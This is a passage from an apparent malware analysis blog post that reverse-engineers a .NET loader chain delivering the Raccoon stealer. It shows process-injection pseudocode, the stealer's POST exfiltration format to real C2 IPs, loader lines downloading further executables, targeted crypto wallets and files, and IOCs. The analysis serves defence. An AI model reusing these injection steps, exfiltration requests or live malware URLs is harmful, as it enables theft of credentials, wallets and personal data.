	- Copies <span style="color:#ae81ff">0</span>x200 bytes <span style="color:#66d9ef">from</span> byte_array starting <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span>x0001AA00
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x0041C000, new_array, new_array.Length, <span style="color:#66d9ef">ref</span> num4)
	- Writes the new_array <span style="color:#66d9ef">into</span> MSBuild.exe at address <span style="color:#ae81ff">0</span>x0041C000
	
WriteProcessMemory(ta.daw, <span style="color:#ae81ff">0</span>x00A58008, new_buffer, <span style="color:#ae81ff">4</span>, <span style="color:#66d9ef">ref</span> num4)
	- new_buffer contains: <span style="color:#ae81ff">0</span>x00004000
	- Appears to write to the PEB section of memory, but unsure
	
kernel32.SetThreadContext(ti.wa1, thread_context_array)
kernel32.ResumeThread(ti.wa1)
</code></pre></div><p>To summarize, an <code>MSBuild.exe</code> process is created in a suspended state, <code>VirtualAllocEx</code> is used to allocate memory within the process, the payload is injected by writing distinct blocks of the byte array to locations in memory, and finally the process thread is resumed.</p>
<p>I set a breakpoint in dnSpy before the execution of ResumeThread and dumped the payload from the memory of MSBuild. I then fixed the section headers in PEBear, leaving me with a new executable to analyze.</p>
<p>After this, the <code>Y4.pn.OcE()</code> method returns, and execution within the DLL is concluded.</p>
<p>After multiple layers, I&rsquo;ve reached the final stage. No more .NET, I&rsquo;ll have to use Ghidra and x32dbg going forward.</p>
<h2 id="stage-four-raccoon">Stage Four: Raccoon</h2>
<p>There is quite a bit to dive into in the final payload, so I will briefly outline each major piece.</p>
<p>Spoiler, the payload is the Raccoon stealer. The execution flow, configuration strings, and C2 IP addresses I will discuss below support this statement.</p>
<h4 id="import-functions">Import Functions</h4>
<p>Using PEStudio to do some initial checking, we can see the binary has has very few imports, but it doesn&rsquo;t appear to be packed.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/pestudio_first.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/pestudio_first.png"
            alt="pestudio_first"
            />
    </a>
    
</figure>
<p>It turns out, in the first function called by main, additional Win32 API functions are imported dynamically using <code>LoadLibraryA</code> and <code>GetProcAddress</code>.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/export_functions.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/export_functions.png"
            alt="export_functions"
            />
    </a>
    
</figure>
The method to decode the strings here is simple, the two arguments are XOR&rsquo;d with each other, using modulus to loop through the second argument when needed. The first string argument is composed of ASCII characters, both printable and non-printable control characters.</p>
<h4 id="mutex">Mutex</h4>
<p>Once the additional functions have been imported, it checks whether a mutex with the name <code>MilcoSoft_#Rip_X</code> exists, and if so, the process terminates. If the mutex does not exist, one is created, and execution continues. This is to ensure only one instance of the stealer is running at a time.</p>
<p>Note: Many of the functions in this binary contain hundreds of library calls with null parameters, creating junk code in an (assumed) attempt to make debugging more difficult.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/junk_functions.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/junk_functions.png"
            alt="junk_functions"
            />
    </a>
    
</figure></p>
<h4 id="string-decode">String Decode</h4>
<p>A function is called to decode a series of strings using the same method as the dynamic imports. Many of the decoded strings match findings in other writeups of the Raccoon stealer.</p>
<pre><code class="language-String" data-lang="String">sgnl_
tlgrm_
ews_
grbr_
dscrd_
\passwords.txt
</code></pre><p>The full list can be found <a href="https://pastebin.com/VjUrW6DW">here</a>.</p>
<h4 id="nt-authoritysystem-check">NT Authority/System Check</h4>
<p>Using OpenProcessToken and GetTokenInformation, check whether the process is currently running under the local System user by checking the user SID of the current process against the string <code>S-1-5-18</code>.
If the SIDs match, CreateToolhelp32Snapshot, DuplicateTokenEx, and CreateProcessWithTokenW are used to duplicate the token of <code>explorer.exe</code>, and a new process is created with the token.</p>
<h4 id="decode-c2-ips">Decode C2 IPs</h4>
<p>Raccoon Stealer allows for operators to configure five command and control server IP addresses, however in this sample, only two were used. The IPs are hard-coded in the binary as ASCII strings, including non-printable characters. They are decoded by XORing each character against characters in corresponding indices of another hardcoded string, <code>f26f614d4c0bc2bcd6601785661fb5cf</code>. We will see this second string used again later.</p>
<pre><code class="language-String" data-lang="String">http://83.217.11.34
http://83.217.11.35
</code></pre><p>These IPs are well documented as associated with Raccoon Stealer.</p>
<h4 id="device-fingerprint">Device Fingerprint</h4>
<p>Before contacting any C2 servers, the malware collects device identifiers. RegOpenKeyExW is used to get the GUID of the device from the key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</code> and GetUserNameW grabs the current user&rsquo;s name.</p>
<p>These identifiers are used to create a string in the following format, where the configId is the XOR key previously used to decode the C2 IPs:</p>
<pre><code class="language-String" data-lang="String">machineId=&lt;GUID&gt;|&lt;username&gt;&amp;configId=f26f614d4c0bc2bcd6601785661fb5cf
</code></pre><h4 id="get-config-from-c2">Get Config From C2</h4>
<p>Use the WinINet API to POST the device fingerprint to the first C2 server, <code>http://83.217.11.34/</code>, with the header string <code>Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\r\n\r\n</code> and the User-Agent <code>901785252112</code>.  If any errors occur, it will attempt to make this request five times.</p>
<p>The InternetReadFile function is then used to capture the response from the C2 server, and save it to a variable. The response will be used to configure the functionality of the stealer. I&rsquo;ve shared the string with line breaks <a href="https://pastebin.com/fv5z9xZc">here</a>.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/c2_response.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/c2_response.png"
            alt="c2_response"
            />
    </a>
    
</figure></p>
<h4 id="download-dlls">Download DLLs</h4>
<p>The first section of the response from the C2 server contains paths to additional DLLs hosted on the C2 server.</p>
<pre><code class="language-Strings" data-lang="Strings">freebl3.dll
mozglue.dll
msvcp140.dll
nss3.dll
softokn3.dll
sqlite3.dll
vcruntime140.dll
</code></pre><p>The malware looks for the each occurrence of the string <code>libs_</code>, extracts the DLL name and its corresponding IP/path string, and uses the WinINet API to download the file from the server to the <code>C:\Users\&lt;user&gt;\AppData\LocalLow\</code> folder. In this case, the User-Agent for the requests is <code>1235125521512</code>.</p>
<p>All of the downloaded DLLs are all legitimate versions, which will be used to steal data from various locations on the system.</p>
<h4 id="new-token">New Token</h4>
<p>Check for the existence of the string <code>token:</code> in the C2 server response, and if it does not exist, the process terminates completely.</p>
<p>If it does exist, the token following the keyword is extracted and used to create a new string in the format <code>http://83.217.11.34/&lt;new_token&gt;</code>.</p>
<h4 id="environment-variable">Environment Variable</h4>
<p>Using the GetEnvironmentVariable and SetEnvironmentVariableW functions, the malware adds the directory <code>C:\Users\&lt;user&gt;\AppData\LocalLow</code> to the PATH environment variable.</p>
<h4 id="collect-system-information">Collect System Information</h4>
<p>Queries registry keys or uses Win32 APIs to construct a long string containing information about the system on which it is running. The output will be in the following format:</p>
<pre><code class="language-String" data-lang="String">System Information: 
	- Locale: English
	- Time zone: 	
	- OS: Windows 10 Home
	- Architecture: x64
	- CPU: Intel(R) Core(TM) i7-6700 CPU @ 340GH (2 cores)
	- RAM: 4095 MB
	- Display size: 1536x781
	- Display Devices:
		0) NVIDIA GeForce GTX 580

Installed applications:
	010 Editor 1201 (64-bit) 
	7-Zip 1505 beta x64 
	...
	&lt;many more&gt;
</code></pre><p>The installed applications are found using the following registry keys:</p>
<pre><code class="language-String" data-lang="String">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
</code></pre><h4 id="post-system-data-to-c2">POST System Data To C2</h4>
<p>A header for a web request is created using a randomly generated string as the boundary field.</p>
<pre><code class="language-String" data-lang="String"> Content-Type: multipart/form-data; boundary=uQuoaXzGzkghm4gR\r\n\r\n\r\n
</code></pre><p>The boundary string will be used to delimit the system information in the POST request.</p>
<p>Send a POST request containing the data collected to the C2 server. The request will be in the following format:</p>
<pre><code class="language-String" data-lang="String">POST /&lt;token&gt; HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=&lt;boundary&gt;
User-Agent: 125122112551
Host: 83.217.11.34
Content-Length: &lt;length&gt;
Connection: Keep-Alive
Cache-Control: no-cache
–&lt;boundary&gt;
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;System Info.txt&quot;
Content-Type: multipart/form-data
System Information: 
	- Locale: English
	- Time zone: 	
	- OS: Windows 10 Home
	- Architecture: x64
	- CPU: Intel(R) Core(TM) i7-6700 CPU @ 340GH (2 cores)
	- RAM: 4095 MB
	- Display size: 1536x781
	- Display Devices:
		0) NVIDIA GeForce GTX 580
Installed applications:
	010 Editor 1201 (64-bit) 
	7-Zip 1505 beta x64 
	...
	&lt;many more&gt;
--&lt;boundary&gt;--
</code></pre><h4 id="data-theft">Data Theft</h4>
<p>After the system information is exfiltrated, the malware begins to steal more sensitive data. In the interest of brevity, I am not going to dig any further into the functionality here. There are many other writeups which do a great job of this. I will simply list the items which this sample is configured to steal.</p>
<pre><code class="language-String" data-lang="String">Browser Data
Various Crypto wallets from software/extensions
	BlockstreamGreen
	TronLink
	MetaMask
	Binance
	Ronin
	JaxxLiberty
	Atomic
	Coinomi
	Electrum
	ElectronCash
	Guarda
	LedgerLive
	Daedalus
	MyMonero
	Wasabi
Local Documents
	%USERPROFILE%\Desktop\|*.txt
	%USERPROFILE%\Desktop\|*.dox
	%USERPROFILE%\Documents\|*.txt
	%USERPROFILE%\Desktop\|*.pdf
Telegram
Discord
</code></pre><p>Each one of these stealer functions would upload the data to the C2 server immediately after capturing it.</p>
<h4 id="screenshots">Screenshots</h4>
<p>The Raccoon stealer has the capability to take screenshots using the GDIPlus and gdi32 DLLs, but this sample is not configured to do so.</p>
<h4 id="load-more-malware">Load More Malware</h4>
<p>The stealer uses the keyword <code>ldr_</code> in the C2 configuration string to determine whether to download even more malware. In this sample, I found the following:</p>
<pre><code class="language-String" data-lang="String">ldr_1:http://77.73.134.24/Clip1.exe|%APPDATA%\|exe
ldr_1:http://77.73.134.35/bebra.exe|%TEMP%\|exe
</code></pre><p>The configuration specifies the server to contact, the file to download, the path to save the download, and the extension to use. I collected these additional binaries, and they can be found on Malshare.</p>
<ul>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=471804a84bc2fa7969bf6ea4e1047e4f3aa1a5f535dad9ff696fc1ae349f885f">Clip1.exe</a>
<ul>
<li>Uses EazFuscator, and I&rsquo;m unable to get any deobfuscators to work. I do not have a lot of experience in this area.</li>
</ul>
</li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=e487cc9c5d05a910d82c833029b1dc9ac00e5729ad05d1dcfafaa4fc64496b6d">bebra.exe</a></li>
</ul>
<h3 id="final-thoughts">Final Thoughts</h3>
<p>I&rsquo;ll summarize the investigative journey - first a malicious .NET binary was downloaded from a link in a YouTube video for cracked software. This binary has a weakly obfuscated .NET DLL embedded in its resources, which is extracted and a specified method is executed.</p>
<p>The first DLL then decrypts and decompresses another .NET DLL from its resources. and then uses methods from the newly created DLL to extract yet another DLL hidden inside a resource bitmap file.</p>
<p>The third DLL extracts the Raccoon stealer from its embedded resources, and injects it into a newly created MSBuild.exe process.</p>
<p>A visual guide: <code>.NET binary -&gt; .NET DLL -&gt; .NET DLL -&gt; .NET DLL -&gt; Raccoon Stealer</code></p>
<h4 id="iocs">IOCs</h4>
<pre><code class="language-string" data-lang="string">83.217.11.34
83.217.11.35
77.73.134.24
77.73.134.35

softwarebeginner.com
emanagesoftware.com/download
bestdogdaycaresoftware.com/1
bittab.pw/SoftwareSetupFile.rar
</code></pre>
      </div>
    </article>

    <hr />

    <div class="post-info">
      
      
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2023-03-14 15:35
        

         
          
        
      </p>
    </div>
      <hr />
   
        













  

  

  

  

  








  


 






<style>
.resp-sharing-button__link,
.resp-sharing-button__icon {
  display: inline-block
}

.resp-sharing-button__link {
  text-decoration: none;
  color: #fff !important;
  margin: 0.5em
}

.resp-sharing-button {
  border-radius: 5px;
  transition: 25ms ease-out;
  padding: 0.5em 0.75em;
  font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
  
}

.resp-sharing-button__icon svg {
  width: 1em;
  height: 1em;
  margin-right: 0.4em;
  vertical-align: middle
}

.resp-sharing-button--small svg {
  margin: 0;
  vertical-align: middle
}

 
.resp-sharing-button__icon {
  stroke: #fff;
  fill: none
}

 
.resp-sharing-button__icon--solid,
.resp-sharing-button__icon--solidcircle {
  fill: #fff;
  stroke: none
}

.resp-sharing-button--twitter {
  background-color: #55acee
}

.resp-sharing-button--twitter:hover {
  background-color: #2795e9
}

.resp-sharing-button--pinterest {
  background-color: #bd081c
}

.resp-sharing-button--pinterest:hover {
  background-color: #8c0615
}

.resp-sharing-button--facebook {
  background-color: #3b5998
}

.resp-sharing-button--facebook:hover {
  background-color: #2d4373
}

.resp-sharing-button--tumblr {
  background-color: #35465C
}

.resp-sharing-button--tumblr:hover {
  background-color: #222d3c
}

.resp-sharing-button--reddit {
  background-color: #ff4500
}

.resp-sharing-button--reddit:hover {
  background-color: #3a80c1
}

.resp-sharing-button--google {
  background-color: #dd4b39
}

.resp-sharing-button--google:hover {
  background-color: #c23321
}

.resp-sharing-button--linkedin {
  background-color: #0077b5
}

.resp-sharing-button--linkedin:hover {
  background-color: #046293
}

.resp-sharing-button--email {
  background-color: #777
}

.resp-sharing-button--email:hover {
  background-color: #5e5e5e
}

.resp-sharing-button--xing {
  background-color: #1a7576
}

.resp-sharing-button--xing:hover {
  background-color: #114c4c
}

.resp-sharing-button--whatsapp {
  background-color: #25D366
}

.resp-sharing-button--whatsapp:hover {
  background-color: #1da851
}

.resp-sharing-button--hackernews {
background-color: #FF6600
}
.resp-sharing-button--hackernews:hover, .resp-sharing-button--hackernews:focus {   background-color: #FB6200 }

.resp-sharing-button--vk {
  background-color: #507299
}

.resp-sharing-button--vk:hover {
  background-color: #43648c
}

.resp-sharing-button--facebook {
  background-color: #3b5998;
  border-color: #3b5998;
}

.resp-sharing-button--facebook:hover,
.resp-sharing-button--facebook:active {
  background-color: #2d4373;
  border-color: #2d4373;
}

.resp-sharing-button--twitter {
  background-color: #55acee;
  border-color: #55acee;
}

.resp-sharing-button--twitter:hover,
.resp-sharing-button--twitter:active {
  background-color: #2795e9;
  border-color: #2795e9;
}

.resp-sharing-button--tumblr {
  background-color: #35465C;
  border-color: #35465C;
}

.resp-sharing-button--tumblr:hover,
.resp-sharing-button--tumblr:active {
  background-color: #222d3c;
  border-color: #222d3c;
}

.resp-sharing-button--email {
  background-color: #777777;
  border-color: #777777;
}

.resp-sharing-button--email:hover,
.resp-sharing-button--email:active {
  background-color: #5e5e5e;
  border-color: #5e5e5e;
}

.resp-sharing-button--pinterest {
  background-color: #bd081c;
  border-color: #bd081c;
}

.resp-sharing-button--pinterest:hover,
.resp-sharing-button--pinterest:active {
  background-color: #8c0615;
  border-color: #8c0615;
}

.resp-sharing-button--linkedin {
  background-color: #0077b5;
  border-color: #0077b5;
}

.resp-sharing-button--linkedin:hover,
.resp-sharing-button--linkedin:active {
  background-color: #046293;
  border-color: #046293;
}

.resp-sharing-button--reddit {
  background-color: #ff4500;
  border-color: #ff4500;
}

.resp-sharing-button--reddit:hover,
.resp-sharing-button--reddit:active {
  background-color: #ff5700;
  border-color: #ff5700;
}

.resp-sharing-button--xing {
  background-color: #1a7576;
  border-color: #1a7576;
}

.resp-sharing-button--xing:hover
.resp-sharing-button--xing:active {
  background-color: #114C4C;
  border-color: #114C4C;
}

.resp-sharing-button--whatsapp {
  background-color: #25D366;
  border-color: #25D366;
}

.resp-sharing-button--whatsapp:hover,
.resp-sharing-button--whatsapp:active {
  background-color: #1DA851;
  border-color: #1DA851;
}

.resp-sharing-button--hackernews {
  background-color: #FF6600;
  border-color: #FF6600;
}

.resp-sharing-button--hackernews:hover
.resp-sharing-button--hackernews:active {
  background-color: #FB6200;
  border-color: #FB6200;
}

.resp-sharing-button--vk {
  background-color: #507299;
  border-color: #507299;
}

.resp-sharing-button--vk:hover
.resp-sharing-button--vk:active {
  background-color: #43648c;
  border-color: #43648c;
}

.resp-sharing-button--telegram {
  background-color: #54A9EB;
}

.resp-sharing-button--telegram:hover {
  background-color: #4B97D1;
}
</style>




<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/" target="_blank" rel="noopener" aria-label="" title="Facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>


    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Raccoons%20Nesting%20In%20.NET&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/" target="_blank" rel="noopener" aria-label="" title="Twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>

    
    </div>
  </div>
</a>










<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/&amp;title=Raccoons%20Nesting%20In%20.NET&amp;summary=Raccoons%20Nesting%20In%20.NET&amp;https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>

    
    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/&amp;resubmit=true&amp;title=Raccoons%20Nesting%20In%20.NET" target="_blank" rel="noopener" aria-label="" title="Reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M24 11.5c0-1.65-1.35-3-3-3-.96 0-1.86.48-2.42 1.24-1.64-1-3.75-1.64-6.07-1.72.08-1.1.4-3.05 1.52-3.7.72-.4 1.73-.24 3 .5C17.2 6.3 18.46 7.5 20 7.5c1.65 0 3-1.35 3-3s-1.35-3-3-3c-1.38 0-2.54.94-2.88 2.22-1.43-.72-2.64-.8-3.6-.25-1.64.94-1.95 3.47-2 4.55-2.33.08-4.45.7-6.1 1.72C4.86 8.98 3.96 8.5 3 8.5c-1.65 0-3 1.35-3 3 0 1.32.84 2.44 2.05 2.84-.03.22-.05.44-.05.66 0 3.86 4.5 7 10 7s10-3.14 10-7c0-.22-.02-.44-.05-.66 1.2-.4 2.05-1.54 2.05-2.84zM2.3 13.37C1.5 13.07 1 12.35 1 11.5c0-1.1.9-2 2-2 .64 0 1.22.32 1.6.82-1.1.85-1.92 1.9-2.3 3.05zm3.7.13c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm9.8 4.8c-1.08.63-2.42.96-3.8.96-1.4 0-2.74-.34-3.8-.95-.24-.13-.32-.44-.2-.68.15-.24.46-.32.7-.18 1.83 1.06 4.76 1.06 6.6 0 .23-.13.53-.05.67.2.14.23.06.54-.18.67zm.2-2.8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm5.7-2.13c-.38-1.16-1.2-2.2-2.3-3.05.38-.5.97-.82 1.6-.82 1.1 0 2 .9 2 2 0 .84-.53 1.57-1.3 1.87z"/></svg>

    
    </div>
  </div>
</a>








<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/&amp;t=Raccoons%20Nesting%20In%20.NET" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 140"><path fill-rule="evenodd" d="M60.94 82.314L17 0h20.08l25.85 52.093c.397.927.86 1.888 1.39 2.883.53.994.995 2.02 1.393 3.08.265.4.463.764.596 1.095.13.334.262.63.395.898.662 1.325 1.26 2.618 1.79 3.877.53 1.26.993 2.42 1.39 3.48 1.06-2.254 2.22-4.673 3.48-7.258 1.26-2.585 2.552-5.27 3.877-8.052L103.49 0h18.69L77.84 83.308v53.087h-16.9v-54.08z"></path></svg>

      
    </div>
  </div>
</a>









    
    <div class="pagination">
        
        <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
        </div>
        

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://rerednawyerg.github.io/posts/malwareanalysis/gad_sectoprat_update/">
                    <span class="button__text">SectopRAT Loader - Updates</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.97a8045a726eccf303b74163251eb214dcb8fce3e0eaddb67866dc97cd45bb5954e4edd26e063cf1b285743e3331ab3a31a0ba5703b1fced4a406fc7b7205eb3.js" integrity="sha512-l6gEWnJuzPMDt0FjJR6yFNy4/OPg6t22eGbcl81Fu1lU5O3SbgY88bKFdD4zMas6MaC6VwOx/O1KQG/HtyBesw=="></script>



    </body>
</html>
